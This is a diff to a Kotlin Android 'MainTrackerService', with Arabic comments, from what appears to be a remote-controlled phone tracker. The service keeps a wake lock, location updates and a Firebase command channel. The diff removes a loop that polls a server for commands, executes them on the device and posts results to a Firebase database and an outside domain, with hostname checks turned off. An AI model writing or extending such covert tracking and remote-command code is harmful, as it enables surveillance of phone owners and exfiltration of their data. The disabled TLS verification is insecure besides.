@@ -63,7 +63,6 @@ class MainTrackerService : Service() {
         acquireWakeLock()
         startLocationUpdates()
         startBatteryMonitor()
-        startServerCommandPolling()
         startFirebaseCommandService()
     }
 
@@ -162,48 +161,10 @@ class MainTrackerService : Service() {
     }
 
     // ==================== ==================== ====================
-    //         استقبال الأوامر من السيرفر (بدون getUpdates)
+    //         ⚠️ تم إزالة استطلاع REST API للأوامر
+    //         FirebaseCommandService هو المصدر الوحيد للأوامر الآن
+    //         هذا يمنع تنفيذ الأمر مرتين (مرة من Firebase ومرة من REST API)
     // ==================== ==================== ====================
-
-    private fun startServerCommandPolling() {
-        serviceScope.launch(Dispatchers.IO) {
-            Log.d(TAG, "بدء استطلاع الأوامر من السيرفر (بدون getUpdates)...")
-            while (isActive) {
-                try {
-                    val deviceId = SharedPrefsManager.getDeviceId(this@MainTrackerService)
-                    if (deviceId != null) {
-                        val cmds: List<com.abuzahra.tracker.BotServerClient.Command> = BotServerClient.getPendingCommands(deviceId)
-                        if (cmds.isNotEmpty()) {
-                            Log.d(TAG, "تم استلام ${cmds.size} أوامر من السيرفر")
-                            for (cmd in cmds) {
-                                try {
-                                    val params = if (cmd.params != null) {
-                                        val json = org.json.JSONObject()
-                                        for ((k, v) in cmd.params) json.put(k, v)
-                                        json
-                                    } else {
-                                        org.json.JSONObject()
-                                    }
-                                    // تنفيذ الأمر والحصول على النتيجة
-                                    val result = CommandExecutor.execute(this@MainTrackerService, cmd.command, params)
-                                    Log.d(TAG, "نتيجة الأمر ${cmd.command}: ${result.take(200)}")
-
-                                    // إرسال النتيجة للسيرفر عبر API
-                                    reportCommandResult(cmd.id ?: "", cmd.command, result, deviceId)
-                                } catch (e: Exception) {
-                                    Log.e(TAG, "خطأ في تنفيذ الأمر ${cmd.command}: ${e.message}")
-                                    reportCommandResult(cmd.id ?: "", cmd.command, "{\"ok\":false,\"error\":\"${e.message}\"}", deviceId)
-                                }
-                            }
-                        }
-                    }
-                } catch (e: Exception) {
-                    Log.e(TAG, "خطأ في استطلاع السيرفر: ${e.message}")
-                }
-                delay(10_000) // فحص كل 10 ثوان
-            }
-        }
-    }
 
     private fun startFirebaseCommandService() {
         try {
@@ -219,65 +180,10 @@ class MainTrackerService : Service() {
         }
     }
 
-    /**
-     * إرسال نتيجة الأمر للسيرفر و Firebase
-     */
-    private fun reportCommandResult(cmdId: String, command: String, result: String, deviceId: String) {
-        if (cmdId.isEmpty()) {
-            Log.w(TAG, "معرف الأمر فارغ - لا يمكن إرسال النتيجة")
-            return
-        }
-        serviceScope.launch(Dispatchers.IO) {
-            // 1. كتابة النتيجة في Firebase (الأولوية الأولى)
-            try {
-                val resultObj = org.json.JSONObject()
-                resultObj.put("command", command)
-                resultObj.put("result", result)
-                resultObj.put("status", "completed")
-                resultObj.put("timestamp", System.currentTimeMillis())
-                
-                val firebaseUrl = "https://studio-7073076148-6afe0-default-rtdb.firebaseio.com/results/$deviceId/$cmdId.json"
-                val url = java.net.URL(firebaseUrl)
-                val connection = url.openConnection() as java.net.HttpURLConnection
-                connection.requestMethod = "PUT"
-                connection.setRequestProperty("Content-Type", "application/json")
-                connection.doOutput = true
-                connection.connectTimeout = 10000
-                connection.readTimeout = 10000
-                connection.outputStream.write(resultObj.toString().toByteArray(Charsets.UTF_8))
-                connection.outputStream.flush()
-                val firebaseCode = connection.responseCode
-                connection.disconnect()
-                Log.d(TAG, "Firebase result write: $firebaseCode for cmd $cmdId")
-            } catch (e: Exception) {
-                Log.e(TAG, "Firebase result write error: ${e.message}")
-            }
-            
-            // 2. إرسال النتيجة للسيرفر عبر REST API (كـ backup)
-            try {
-                val serverUrl = "https://alsydyabwalzhra.online/api/command_result/$cmdId"
-                val url = java.net.URL(serverUrl)
-                val connection = url.openConnection() as java.net.HttpURLConnection
-                connection.requestMethod = "POST"
-                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
-                connection.connectTimeout = 15000
-                connection.readTimeout = 15000
-                connection.doOutput = true
-                connection.sslSocketFactory = javax.net.ssl.HttpsURLConnection.getDefaultSSLSocketFactory()
-                connection.hostnameVerifier = javax.net.ssl.HostnameVerifier { _, _ -> true }
-
-                val payload = "{\"status\":\"completed\",\"result\":${org.json.JSONObject.quote(result)}}"
-                java.io.OutputStreamWriter(connection.outputStream, "UTF-8").use { it.write(payload) }
-
-                val responseCode = connection.responseCode
-                Log.d(TAG, "Server result report: $responseCode for cmd $cmdId")
-                connection.disconnect()
-            } catch (e: Exception) {
-                Log.e(TAG, "Server result report error: ${e.message}")
-            }
-        }
-    }
-
+    // ==================== ==================== ====================
+    //         ⚠️ تم إزالة reportCommandResult
+    //         FirebaseCommandService يكتب النتائج مباشرة
+    // ==================== ==================== ====================
     // ==================== ==================== ====================
     //              إدارة الطاقة (Power Management)
     // ==================== ==================== ====================
